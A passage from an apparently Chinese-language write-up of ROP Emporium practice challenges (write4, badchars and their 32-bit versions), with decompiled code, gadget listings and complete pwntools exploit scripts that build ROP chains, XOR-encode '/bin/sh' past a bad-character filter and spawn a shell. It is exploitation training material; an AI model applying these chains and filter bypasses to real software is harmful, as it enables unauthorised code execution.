    {
      setvbuf(_bss_start, 0LL, 2, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      puts("write4 by ROP Emporium");
      puts("64bits\n");
      pwnme();
      puts("\nExiting");
      return 0;
    }
    char *pwnme()
    {
      char s; // [rsp+0h] [rbp-20h]
      memset(&s, 0, 0x20uLL);
      puts("Go ahead and give me the string already!");
      printf("> ", 0LL);
      return fgets(&s, 512, stdin);
    }
    int usefulFunction()
    {
      return system("/bin/ls");
    }
可以发现，代码和之前的题目没有太多区别，唯一不同的是，我们找不到system的参数了，程序中不再出现'/bin/cat
flag.txt'的参数了，因此我们得自己写参数
但程序中并没有直接写bss段的操作
于是我们需要构造rop来写入一个/bin/sh参数
最后调用system(/bin/sh)
首先找一波可利用的gadget
    $ ROPgadget --binary write4 --only "mov|pop|ret" 
    Gadgets information
    ============================================================
    0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret
    0x0000000000400821 : mov dword ptr [rsi], edi ; ret
    0x00000000004007ae : mov eax, 0 ; pop rbp ; ret
    0x0000000000400820 : mov qword ptr [r14], r15 ; ret
    0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret
    0x0000000000400890 : pop r14 ; pop r15 ; ret
    0x0000000000400892 : pop r15 ; ret
    0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret
    0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret
    0x00000000004006b0 : pop rbp ; ret
    0x0000000000400893 : pop rdi ; ret
    0x0000000000400891 : pop rsi ; pop r15 ; ret
    0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    0x00000000004005b9 : ret
我们发现，有这两条
`mov qword ptr [r14], r15 ; ret`
`pop r14 ; pop r15 ; ret`
这意味着我们可以通过这两条gadget实现任意地址写，把“/bin/sh\x00”写入bss段中，接着在将参数传入rdi寄存器的时候就传bss的地址就行了
exp如下
    #!/usr/bin/python
    #coding:utf-8
    from pwn import *
    context.log_level = 'debug'
    p = process('./write4')
    pop_rdi_ret = 0x400893
    mov_r15_2_r14_ret = 0x400820
    pop_r14_r15_ret= 0x400890 
    bss = 0x601060
    binsh = '/bin/sh\x00'  #sh\x00\x00\x00\x00\x00\x00也可以，只要在八字节内就行
    system = 0x4005e0
    payload = 'a'*(0x20+0x08) 
    payload += p64(pop_r14_r15_ret) + p64(bss) +binsh
    payload += p64(mov_r15_2_r14_ret)
    payload += p64(pop_rdi_ret) +p64(bss) +p64(system) 
    p.sendline(payload)
    p.interactive()
# 8.write4 32
原理同上，注意binsh参数的长度即可，32位下有四个字节的长度限制
另外在本程序中，间接传至利用的是edi和ebp寄存器
    #!/usr/bin/python
    #coding:utf-8
    from pwn import *
    context.log_level = 'debug'
    p = process('./write432')
    mov_edi_ebp_ret = 0x08048670 
    pop_edi_ebp_ret = 0x080486da 
    bss = 0x0804a040
    binsh = 'sh\x00\x00' #32位程序仅有四个字节可以写入，所以只能构造system(sh)
    #也还可以构造system($0)
    system = 0x08048430
    payload = 'a'*(0x28+0x04) 
    payload += p32(pop_edi_ebp_ret)+p32(bss)+binsh
    payload += p32(mov_edi_ebp_ret)
    payload += p32(system)+p32(0xdeadbeef)+p32(bss)
    p.sendline(payload)
    p.interactive()
# 9.badchars
这题比较猥琐一点，直接过滤了一些字符不给你输入
    unsigned __int64 __fastcall checkBadchars(__int64 a1, unsigned __int64 a2)
    {
      unsigned __int64 result; // rax
      char v3; // [rsp+10h] [rbp-20h]
      char v4; // [rsp+11h] [rbp-1Fh]
      char v5; // [rsp+12h] [rbp-1Eh]
      char v6; // [rsp+13h] [rbp-1Dh]
      char v7; // [rsp+14h] [rbp-1Ch]
      char v8; // [rsp+15h] [rbp-1Bh]
      char v9; // [rsp+16h] [rbp-1Ah]
      char v10; // [rsp+17h] [rbp-19h]
      unsigned __int64 j; // [rsp+20h] [rbp-10h]
      unsigned __int64 i; // [rsp+28h] [rbp-8h]
      v3 = 'b';
      v4 = 'i';
      v5 = 'c';
      v6 = '/';
      v7 = ' ';
      v8 = 'f';
      v9 = 'n';
      v10 = 's';
      j = 0LL;
      for ( i = 0LL; ; ++i )
      {
        result = i;
        if ( i >= a2 )
          break;
        for ( j = 0LL; j  f n s”，就会被替换成0xEBu
那么system函数的参数都用不了，就需要别的操作去完成参数的构造
通过查ropgadget，我们发现有这些：
pop_r12_r13_ret = 0x0000000000400b3b  
mov_r13_r12_ret = 0x0000000000400b34  
pop_r14_r15_ret = 0x0000000000400b40  
xor_r15_r14_ret = 0x0000000000400b30  
pop_rdi_ret=0x0000000000400b39
我们可以对binsh参数先进行异或的加密，从而可以绕过checkBadchars函数
进入函数，完成输入到bss段以后，再用xor的gadget，可以完成对参数的解密
最后再跳转执行system(/bin/sh)
首先需要测出10以内的异或数字：
    binsh = '/bin/sh\x00'
    badchar = [98, 105, 99, 47, 32, 102, 110, 115]
    xornum = 1
    while 1:
        for x in binsh:
            tmp = ord(x) ^ xornum
            if tmp in badchar:
                xornum += 1
                break
            if x == "\x00":
                print xornum
                xornum +=1
        if xornum == 10:
            break        
    #检测出2,3,5,9都能用
exp如下
    #!/usr/bin/python 
    #coding:utf-8
    from pwn import *
    context.log_level = 'debug'
    p = process("./badchars")
    system = 0x4006f0
    bss = 0x601080
    pop_r12_r13_ret = 0x0000000000400b3b 
    mov_r13_r12_ret = 0x0000000000400b34 
    pop_r14_r15_ret = 0x0000000000400b40 
    xor_r15_r14_ret = 0x0000000000400b30 
    pop_rdi_ret=0x0000000000400b39
    binsh = '/bin/sh\x00'
    xorbinsh = ''
    for x in binsh:
        xorbinsh += chr(ord(x) ^ 2) 
    payload = 'a'*(0x20+0x08)
    payload += p64(pop_r12_r13_ret) + xorbinsh + p64(bss)
    payload += p64(mov_r13_r12_ret)
    for x in xrange(0,len(xorbinsh)):   
        payload += p64(pop_r14_r15_ret)
        payload += p64(2)
        payload += p64(bss + x)
        payload += p64(xor_r15_r14_ret)
    payload += p64(pop_rdi_ret)
    payload += p64(bss)
    payload += p64(system)
    p.recvuntil("> ")
    p.sendline(payload)
    p.interactive()
# 10.badchars32
原理同上
    #!python
    #coding:utf-8
    from pwn import *
    context.log_level = 'debug'
    p = process("./badchars32")
    mov_edi_esi_ret = 0x08048893 
    pop_esi_edi_ret = 0x08048899
    pop_ebx_ecx_ret = 0x08048896
    xor_ebx_ecl_ret = 0x08048890
    system = 0x080484E0
    bss = 0x0804a040
    binsh = '/bin/sh\x00'
    badchar = [98, 105, 99, 47, 32, 102, 110, 115]
    xorbinsh = ''
    for x in binsh:
        xorbinsh += chr(ord(x) ^ 2) 
    #print xorbinsh
    payload = 'a'*(0x28+0x04)
    payload += p32(pop_esi_edi_ret)
    payload += xorbinsh[0:4] +p32(bss)
    payload += p32(mov_edi_esi_ret)
    #需要注意的是32位的程序一次只能传4个字节的字符串，因此xorbinsh需要分两次来发送到bss段里面
    payload += p32(pop_esi_edi_ret)
    payload += xorbinsh[4:8] +p32(bss+4)
    payload += p32(mov_edi_esi_ret)
    for x in xrange(0,len(xorbinsh)):
        payload += p32(pop_ebx_ecx_ret)
        payload += p32(bss+x) + p32(2)
        payload += p32(xor_ebx_ecl_ret)
    payload += p32(system) +p32(0xdeadbeef)+p32(bss)
    p.recvuntil("> ")
    p.sendline(payload)
    p.interactive()
其实这题有非预期解法的，直接调用system($0)也一样可以getshell，完全不用理会检查机制
# 11.fluff
题目的函数设置还是和之前的没有太多的差别
    char *pwnme()
    {
      char s; // [rsp+0h] [rbp-20h]
      memset(&s, 0, 0x20uLL);
      puts("You know changing these strings means I have to rewrite my solutions...");
      printf("> ", 0LL);